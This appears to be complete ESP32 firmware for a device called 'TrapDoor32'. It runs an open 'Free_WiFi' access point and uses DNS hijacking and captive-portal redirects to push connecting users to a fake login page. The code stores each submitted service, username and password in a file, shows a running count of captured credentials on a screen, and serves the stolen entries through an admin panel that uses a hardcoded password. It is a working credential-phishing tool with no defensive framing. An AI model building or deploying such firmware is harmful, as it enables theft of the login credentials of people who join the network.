#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <ArduinoJson.h>
#include <TFT_eSPI.h>

#define TFT_BL 4                  // Back‐light control pin

// Default SoftAP SSID & config path
static const char* DEFAULT_SSID = "Free_WiFi";
const char* CONFIG_PATH         = "/config.json";

// Network settings
IPAddress AP_IP(192,168,4,1);
IPAddress GW   (192,168,4,1);
IPAddress SN   (255,255,255,0);
const byte  DNS_PORT = 53;

// Admin credentials (Basic Auth)
static const char* ADMIN_USER = "admin";
static const char* ADMIN_PWD  = "1234";

DNSServer      dnsServer;
AsyncWebServer server(80);
TFT_eSPI       tft;

// Load SSID from SPIFFS or fall back
String loadSSID() {
  if (SPIFFS.exists(CONFIG_PATH)) {
    File f{SPIFFS.open(CONFIG_PATH, FILE_READ)};
    DynamicJsonDocument doc{256};
    if (deserializeJson(doc, f) == DeserializationError::Ok) {
      String s = doc["ssid"].as<String>();
      if (s.length()) return s;
    }
  }
  return DEFAULT_SSID;
}

// Save SSID to SPIFFS
bool saveSSID(const String &newSSID) {
  DynamicJsonDocument doc{256};
  doc["ssid"] = newSSID;
  File f{SPIFFS.open(CONFIG_PATH, FILE_WRITE)};
  if (!f) return false;
  serializeJson(doc, f);
  return true;
}

// Redirect everything else to captive portal
void handleNotFound(AsyncWebServerRequest *req) {
  req->redirect(String("http://") + AP_IP.toString() + "/");
}

// Persist one credential, keep last 50
void saveCred(const String &svc, const String &user, const String &pass) {
  StaticJsonDocument<1024> doc;
  if (SPIFFS.exists("/creds.json")) {
    File fr{SPIFFS.open("/creds.json", FILE_READ)};
    deserializeJson(doc, fr);
  }
  JsonArray arr = doc.containsKey("entries")
                ? doc["entries"].as<JsonArray>()
                : doc.createNestedArray("entries");
  JsonObject e = arr.createNestedObject();
  e["service"] = svc;
  e["user"]    = user;
  e["pass"]    = pass;
  while (arr.size() > 50) arr.remove(0);
  File fw{SPIFFS.open("/creds.json", FILE_WRITE)};
  serializeJson(doc, fw);
}

// Refresh TFT stats
void updateDisplay() {
  int clients = WiFi.softAPgetStationNum();
  int creds   = 0;
  if (SPIFFS.exists("/creds.json")) {
    File f{SPIFFS.open("/creds.json", FILE_READ)};
    DynamicJsonDocument doc{1024};
    if (deserializeJson(doc, f) == DeserializationError::Ok)
      creds = doc["entries"].as<JsonArray>().size();
  }
  // Clear below header
  tft.fillRect(0, 30, tft.width(), tft.height() - 30, TFT_BLACK);

  tft.setTextSize(2);

  tft.setTextColor(TFT_GREEN);
  tft.drawString("Users:", 10, 40);
  tft.setTextColor(TFT_CYAN);
  tft.drawNumber(clients,  80, 40);

  tft.setTextColor(TFT_GREEN);
  tft.drawString("Creds:", 10, 70);
  tft.setTextColor(TFT_RED);
  tft.drawNumber(creds,    80, 70);
}

void setup() {
  Serial.begin(115200);
  Serial.println("=== Booting ===");

  // Initialize SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("SPIFFS init failed");
  }

  // Determine SSID
  String ssid = loadSSID();
  Serial.printf("Using SSID: %s\n", ssid.c_str());

  // Start SoftAP + DNS
  WiFi.softAPConfig(AP_IP, GW, SN);
  WiFi.softAP(ssid.c_str());
  dnsServer.start(DNS_PORT, "*", AP_IP);
  Serial.print("AP IP: "); Serial.println(WiFi.softAPIP());

  // Serve captive portal
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *req){
    req->send(SPIFFS, "/captive.html", "text/html");
  });
  server.serveStatic("/style.css", SPIFFS, "/style.css");
  server.serveStatic("/script.js", SPIFFS, "/script.js");
  server.serveStatic("/icons/",    SPIFFS, "/icons/");

  // Handle login POST
  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *req){},
    nullptr,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t, size_t) {
      DynamicJsonDocument j{512};
      if (deserializeJson(j, data, len) == DeserializationError::Ok) {
        saveCred(j["service"].as<String>(),
                 j["user"].as<String>(),
                 j["pass"].as<String>());
        req->send(204);
      } else {
        req->send(400, "application/json", "{\"error\":\"invalid JSON\"}");
      }
    }
  );

  // Captive detection endpoints
  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *req){ req->send(204); });
  server.on("/ncsi.txt",      HTTP_GET, [](AsyncWebServerRequest *req){ req->send(204); });
  server.on("/hotspot-detect.html", HTTP_ANY, handleNotFound);
  server.on("/library/test/success.html", HTTP_ANY, handleNotFound);
  server.on("/fwlink", HTTP_ANY, handleNotFound);
  server.onNotFound(handleNotFound);

  // Serve credentials JSON with auth
  server.on("/admin/creds.json", HTTP_GET, [](AsyncWebServerRequest *req){
    if (!req->authenticate(ADMIN_USER, ADMIN_PWD)) 
      return req->requestAuthentication();
    req->send(SPIFFS, "/creds.json", "application/json");
  });

  // Serve admin UI static files
  server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *req){
    if (!req->authenticate(ADMIN_USER, ADMIN_PWD))
      return req->requestAuthentication();
    req->send(SPIFFS, "/admin/admin.html", "text/html");
  });
  server.serveStatic("/admin.css", SPIFFS, "/admin/admin.css");
  server.serveStatic("/admin.js",  SPIFFS, "/admin/admin.js");

  // Change SSID API
  server.on("/admin/wifi", HTTP_POST, [](AsyncWebServerRequest *req){},
    nullptr,
    [](AsyncWebServerRequest *req, uint8_t *data, size_t len, size_t, size_t) {
      DynamicJsonDocument j{256};
      if (deserializeJson(j, data, len) == DeserializationError::Ok) {
        String newSsid = j["ssid"].as<String>();
        if (newSsid.length() && saveSSID(newSsid)) {
          WiFi.softAPdisconnect(true);
          WiFi.softAP(newSsid.c_str());
          req->send(200, "application/json",
            String("{\"result\":\"ok\",\"ssid\":\"") + newSsid + "\"}");
          return;
        }
      }
      req->send(400, "application/json", "{\"error\":\"invalid SSID\"}");
    }
  );

  server.begin();
  Serial.println("HTTP server started");

  // Initialize TFT in portrait
  tft.init();
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);

  tft.setRotation(0);
  tft.fillScreen(TFT_BLACK);

  // Draw header
  tft.setTextSize(2);
  tft.setTextColor(TFT_YELLOW);
  tft.drawString("TrapDoor32", 10, 10);
  tft.drawFastHLine(0, 30, tft.width(), TFT_WHITE);

  // Initial zeros
  tft.setTextColor(TFT_CYAN);
  tft.drawNumber(0, 80, 40);
  tft.drawNumber(0, 80, 70);
}

void loop() {
  dnsServer.processNextRequest();
  static unsigned long last = millis();
  if (millis() - last > 2000) {
    last = millis();
    updateDisplay();
  }
}
